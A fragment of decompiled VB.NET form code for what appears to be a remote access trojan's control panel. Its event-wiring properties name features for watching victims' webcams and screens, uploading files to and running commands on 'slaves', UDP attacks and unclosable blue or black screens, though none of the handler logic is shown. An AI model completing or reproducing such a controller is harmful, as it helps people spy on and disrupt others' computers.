                Return Me._OpenAdflyToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.OpenAdflyToolStripMenuItem_Click)
                If (Not Me._OpenAdflyToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._OpenAdflyToolStripMenuItem.Click, handler
                End If
                Me._OpenAdflyToolStripMenuItem = WithEventsValue
                If (Not Me._OpenAdflyToolStripMenuItem Is Nothing) Then
                    AddHandler Me._OpenAdflyToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property OpenCDDToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._OpenCDDToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.OpenCDDToolStripMenuItem_Click)
                If (Not Me._OpenCDDToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._OpenCDDToolStripMenuItem.Click, handler
                End If
                Me._OpenCDDToolStripMenuItem = WithEventsValue
                If (Not Me._OpenCDDToolStripMenuItem Is Nothing) Then
                    AddHandler Me._OpenCDDToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property OpenChatToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._OpenChatToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.OpenChatToolStripMenuItem_Click)
                If (Not Me._OpenChatToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._OpenChatToolStripMenuItem.Click, handler
                End If
                Me._OpenChatToolStripMenuItem = WithEventsValue
                If (Not Me._OpenChatToolStripMenuItem Is Nothing) Then
                    AddHandler Me._OpenChatToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property OpenNotepadToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._OpenNotepadToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.OpenNotepadToolStripMenuItem_Click)
                If (Not Me._OpenNotepadToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._OpenNotepadToolStripMenuItem.Click, handler
                End If
                Me._OpenNotepadToolStripMenuItem = WithEventsValue
                If (Not Me._OpenNotepadToolStripMenuItem Is Nothing) Then
                    AddHandler Me._OpenNotepadToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property OpenOtherPPCToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._OpenOtherPPCToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.OpenOtherPPCToolStripMenuItem_Click)
                If (Not Me._OpenOtherPPCToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._OpenOtherPPCToolStripMenuItem.Click, handler
                End If
                Me._OpenOtherPPCToolStripMenuItem = WithEventsValue
                If (Not Me._OpenOtherPPCToolStripMenuItem Is Nothing) Then
                    AddHandler Me._OpenOtherPPCToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property OtherToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._OtherToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Me._OtherToolStripMenuItem = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Panel1 As Panel
            <DebuggerNonUserCode> _
            Get
                Return Me._Panel1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Panel)
                Me._Panel1 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Panel2 As Panel
            <DebuggerNonUserCode> _
            Get
                Return Me._Panel2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Panel)
                Me._Panel2 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Panel3 As Panel
            <DebuggerNonUserCode> _
            Get
                Return Me._Panel3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Panel)
                Me._Panel3 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Panel4 As Panel
            <DebuggerNonUserCode> _
            Get
                Return Me._Panel4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Panel)
                Me._Panel4 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Panel5 As Panel
            <DebuggerNonUserCode> _
            Get
                Return Me._Panel5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Panel)
                Me._Panel5 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Panel6 As Panel
            <DebuggerNonUserCode> _
            Get
                Return Me._Panel6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Panel)
                Me._Panel6 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property phpv As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._phpv
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._phpv = WithEventsValue
            End Set
        End Property

        Friend Overridable Property PictureBox1 As PictureBox
            <DebuggerNonUserCode> _
            Get
                Return Me._PictureBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As PictureBox)
                Me._PictureBox1 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property ProcessViewerToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ProcessViewerToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ProcessViewerToolStripMenuItem_Click)
                If (Not Me._ProcessViewerToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ProcessViewerToolStripMenuItem.Click, handler
                End If
                Me._ProcessViewerToolStripMenuItem = WithEventsValue
                If (Not Me._ProcessViewerToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ProcessViewerToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RefreshSlavesToolStripMenuItem1 As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._RefreshSlavesToolStripMenuItem1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RefreshSlavesToolStripMenuItem1_Click)
                If (Not Me._RefreshSlavesToolStripMenuItem1 Is Nothing) Then
                    RemoveHandler Me._RefreshSlavesToolStripMenuItem1.Click, handler
                End If
                Me._RefreshSlavesToolStripMenuItem1 = WithEventsValue
                If (Not Me._RefreshSlavesToolStripMenuItem1 Is Nothing) Then
                    AddHandler Me._RefreshSlavesToolStripMenuItem1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RestartClientToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._RestartClientToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RestartClientToolStripMenuItem_Click)
                If (Not Me._RestartClientToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._RestartClientToolStripMenuItem.Click, handler
                End If
                Me._RestartClientToolStripMenuItem = WithEventsValue
                If (Not Me._RestartClientToolStripMenuItem Is Nothing) Then
                    AddHandler Me._RestartClientToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RestartComputerToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._RestartComputerToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RestartComputerToolStripMenuItem_Click)
                If (Not Me._RestartComputerToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._RestartComputerToolStripMenuItem.Click, handler
                End If
                Me._RestartComputerToolStripMenuItem = WithEventsValue
                If (Not Me._RestartComputerToolStripMenuItem Is Nothing) Then
                    AddHandler Me._RestartComputerToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RichTextBox1 As RichTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._RichTextBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As RichTextBox)
                Me._RichTextBox1 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property RunBatchScriptCMDToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._RunBatchScriptCMDToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RunBatchScriptCMDToolStripMenuItem_Click)
                If (Not Me._RunBatchScriptCMDToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._RunBatchScriptCMDToolStripMenuItem.Click, handler
                End If
                Me._RunBatchScriptCMDToolStripMenuItem = WithEventsValue
                If (Not Me._RunBatchScriptCMDToolStripMenuItem Is Nothing) Then
                    AddHandler Me._RunBatchScriptCMDToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RunCmdToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._RunCmdToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RunCmdToolStripMenuItem_Click)
                If (Not Me._RunCmdToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._RunCmdToolStripMenuItem.Click, handler
                End If
                Me._RunCmdToolStripMenuItem = WithEventsValue
                If (Not Me._RunCmdToolStripMenuItem Is Nothing) Then
                    AddHandler Me._RunCmdToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RunThingsToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._RunThingsToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Me._RunThingsToolStripMenuItem = WithEventsValue
            End Set
        End Property

        Friend Overridable Property ScreenToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ScreenToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Me._ScreenToolStripMenuItem = WithEventsValue
            End Set
        End Property

        Friend Overridable Property SelectAllSlavesToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._SelectAllSlavesToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.SelectAllSlavesToolStripMenuItem_Click)
                If (Not Me._SelectAllSlavesToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._SelectAllSlavesToolStripMenuItem.Click, handler
                End If
                Me._SelectAllSlavesToolStripMenuItem = WithEventsValue
                If (Not Me._SelectAllSlavesToolStripMenuItem Is Nothing) Then
                    AddHandler Me._SelectAllSlavesToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property SelectedV As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._SelectedV
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._SelectedV = WithEventsValue
            End Set
        End Property

        Friend Overridable Property ServerSettingsToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ServerSettingsToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Me._ServerSettingsToolStripMenuItem = WithEventsValue
            End Set
        End Property

        Friend Overridable Property ShowClientLogsToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ShowClientLogsToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ShowClientLogsToolStripMenuItem_Click)
                If (Not Me._ShowClientLogsToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ShowClientLogsToolStripMenuItem.Click, handler
                End If
                Me._ShowClientLogsToolStripMenuItem = WithEventsValue
                If (Not Me._ShowClientLogsToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ShowClientLogsToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ShowImageToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ShowImageToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ShowImageToolStripMenuItem_Click)
                If (Not Me._ShowImageToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ShowImageToolStripMenuItem.Click, handler
                End If
                Me._ShowImageToolStripMenuItem = WithEventsValue
                If (Not Me._ShowImageToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ShowImageToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ShutdownComputerToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ShutdownComputerToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ShutdownComputerToolStripMenuItem_Click)
                If (Not Me._ShutdownComputerToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ShutdownComputerToolStripMenuItem.Click, handler
                End If
                Me._ShutdownComputerToolStripMenuItem = WithEventsValue
                If (Not Me._ShutdownComputerToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ShutdownComputerToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property SlavesToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._SlavesToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Me._SlavesToolStripMenuItem = WithEventsValue
            End Set
        End Property

        Friend Overridable Property SleepToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._SleepToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Me._SleepToolStripMenuItem = WithEventsValue
            End Set
        End Property

        Friend Overridable Property SOnline As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._SOnline
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.SOnline_Click)
                If (Not Me._SOnline Is Nothing) Then
                    RemoveHandler Me._SOnline.Click, handler
                End If
                Me._SOnline = WithEventsValue
                If (Not Me._SOnline Is Nothing) Then
                    AddHandler Me._SOnline.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property StartWebsiteToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._StartWebsiteToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.StartWebsiteToolStripMenuItem_Click)
                If (Not Me._StartWebsiteToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._StartWebsiteToolStripMenuItem.Click, handler
                End If
                Me._StartWebsiteToolStripMenuItem = WithEventsValue
                If (Not Me._StartWebsiteToolStripMenuItem Is Nothing) Then
                    AddHandler Me._StartWebsiteToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property TalkComputerToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._TalkComputerToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.TalkComputerToolStripMenuItem_Click)
                If (Not Me._TalkComputerToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._TalkComputerToolStripMenuItem.Click, handler
                End If
                Me._TalkComputerToolStripMenuItem = WithEventsValue
                If (Not Me._TalkComputerToolStripMenuItem Is Nothing) Then
                    AddHandler Me._TalkComputerToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Timer1 As Timer
            <DebuggerNonUserCode> _
            Get
                Return Me._Timer1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Timer)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Timer1_Tick_1)
                If (Not Me._Timer1 Is Nothing) Then
                    RemoveHandler Me._Timer1.Tick, handler
                End If
                Me._Timer1 = WithEventsValue
                If (Not Me._Timer1 Is Nothing) Then
                    AddHandler Me._Timer1.Tick, handler
                End If
            End Set
        End Property

        Friend Overridable Property Timer2 As Timer
            <DebuggerNonUserCode> _
            Get
                Return Me._Timer2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Timer)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Timer1_Tick)
                If (Not Me._Timer2 Is Nothing) Then
                    RemoveHandler Me._Timer2.Tick, handler
                End If
                Me._Timer2 = WithEventsValue
                If (Not Me._Timer2 Is Nothing) Then
                    AddHandler Me._Timer2.Tick, handler
                End If
            End Set
        End Property

        Friend Overridable Property Timer3 As Timer
            <DebuggerNonUserCode> _
            Get
                Return Me._Timer3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Timer)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Timer3_Tick)
                If (Not Me._Timer3 Is Nothing) Then
                    RemoveHandler Me._Timer3.Tick, handler
                End If
                Me._Timer3 = WithEventsValue
                If (Not Me._Timer3 Is Nothing) Then
                    AddHandler Me._Timer3.Tick, handler
                End If
            End Set
        End Property

        Friend Overridable Property ToolStripSeparator1 As ToolStripSeparator
            <DebuggerNonUserCode> _
            Get
                Return Me._ToolStripSeparator1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripSeparator)
                Me._ToolStripSeparator1 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property ToolStripSeparator2 As ToolStripSeparator
            <DebuggerNonUserCode> _
            Get
                Return Me._ToolStripSeparator2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripSeparator)
                Me._ToolStripSeparator2 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property ToolStripSeparator3 As ToolStripSeparator
            <DebuggerNonUserCode> _
            Get
                Return Me._ToolStripSeparator3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripSeparator)
                Me._ToolStripSeparator3 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property ToolStripSeparator4 As ToolStripSeparator
            <DebuggerNonUserCode> _
            Get
                Return Me._ToolStripSeparator4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripSeparator)
                Me._ToolStripSeparator4 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property TutorialsToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._TutorialsToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.TutorialsToolStripMenuItem_Click)
                If (Not Me._TutorialsToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._TutorialsToolStripMenuItem.Click, handler
                End If
                Me._TutorialsToolStripMenuItem = WithEventsValue
                If (Not Me._TutorialsToolStripMenuItem Is Nothing) Then
                    AddHandler Me._TutorialsToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property UDPToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._UDPToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.UDPToolStripMenuItem_Click)
                If (Not Me._UDPToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._UDPToolStripMenuItem.Click, handler
                End If
                Me._UDPToolStripMenuItem = WithEventsValue
                If (Not Me._UDPToolStripMenuItem Is Nothing) Then
                    AddHandler Me._UDPToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property UnclosebleBlackScreenToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._UnclosebleBlackScreenToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.UnclosebleBlackScreenToolStripMenuItem_Click)
                If (Not Me._UnclosebleBlackScreenToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._UnclosebleBlackScreenToolStripMenuItem.Click, handler
                End If
                Me._UnclosebleBlackScreenToolStripMenuItem = WithEventsValue
                If (Not Me._UnclosebleBlackScreenToolStripMenuItem Is Nothing) Then
                    AddHandler Me._UnclosebleBlackScreenToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property UnclosebleBlueScreenToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._UnclosebleBlueScreenToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.UnclosebleBlueScreenToolStripMenuItem_Click)
                If (Not Me._UnclosebleBlueScreenToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._UnclosebleBlueScreenToolStripMenuItem.Click, handler
                End If
                Me._UnclosebleBlueScreenToolStripMenuItem = WithEventsValue
                If (Not Me._UnclosebleBlueScreenToolStripMenuItem Is Nothing) Then
                    AddHandler Me._UnclosebleBlueScreenToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property UpdToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._UpdToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.UpdToolStripMenuItem_Click)
                If (Not Me._UpdToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._UpdToolStripMenuItem.Click, handler
                End If
                Me._UpdToolStripMenuItem = WithEventsValue
                If (Not Me._UpdToolStripMenuItem Is Nothing) Then
                    AddHandler Me._UpdToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property UploadFileToSlaveToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._UploadFileToSlaveToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.UploadFileToSlaveToolStripMenuItem_Click)
                If (Not Me._UploadFileToSlaveToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._UploadFileToSlaveToolStripMenuItem.Click, handler
                End If
                Me._UploadFileToSlaveToolStripMenuItem = WithEventsValue
                If (Not Me._UploadFileToSlaveToolStripMenuItem Is Nothing) Then
                    AddHandler Me._UploadFileToSlaveToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property VieuwScreenToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._VieuwScreenToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.VieuwScreenToolStripMenuItem_Click)
                If (Not Me._VieuwScreenToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._VieuwScreenToolStripMenuItem.Click, handler
                End If
                Me._VieuwScreenToolStripMenuItem = WithEventsValue
                If (Not Me._VieuwScreenToolStripMenuItem Is Nothing) Then
                    AddHandler Me._VieuwScreenToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property VieuwWebcamToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._VieuwWebcamToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.VieuwWebcamToolStripMenuItem_Click)
                If (Not Me._VieuwWebcamToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._VieuwWebcamToolStripMenuItem.Click, handler
                End If
                Me._VieuwWebcamToolStripMenuItem = WithEventsValue
                If (Not Me._VieuwWebcamToolStripMenuItem Is Nothing) Then
                    AddHandler Me._VieuwWebcamToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ViewSlaveFilesToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ViewSlaveFilesToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ViewSlaveFilesToolStripMenuItem_Click)
                If (Not Me._ViewSlaveFilesToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ViewSlaveFilesToolStripMenuItem.Click, handler
                End If
                Me._ViewSlaveFilesToolStripMenuItem = WithEventsValue
                If (Not Me._ViewSlaveFilesToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ViewSlaveFilesToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property WakeToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._WakeToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Me._WakeToolStripMenuItem = WithEventsValue
            End Set
        End Property


        ' Fields
        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
        <AccessedThroughProperty("BlackScreenToolStripMenuItem")> _
        Private _BlackScreenToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("BlueScreenToolStripMenuItem")> _
        Private _BlueScreenToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ClientPasswordhostToolStripMenuItem")> _
        Private _ClientPasswordhostToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ClientSettingsToolStripMenuItem")> _
        Private _ClientSettingsToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ClientSettingsToolStripMenuItem1")> _
        Private _ClientSettingsToolStripMenuItem1 As ToolStripMenuItem
        <AccessedThroughProperty("ColoredScreenToolStripMenuItem")> _
        Private _ColoredScreenToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ColumnHeader1")> _
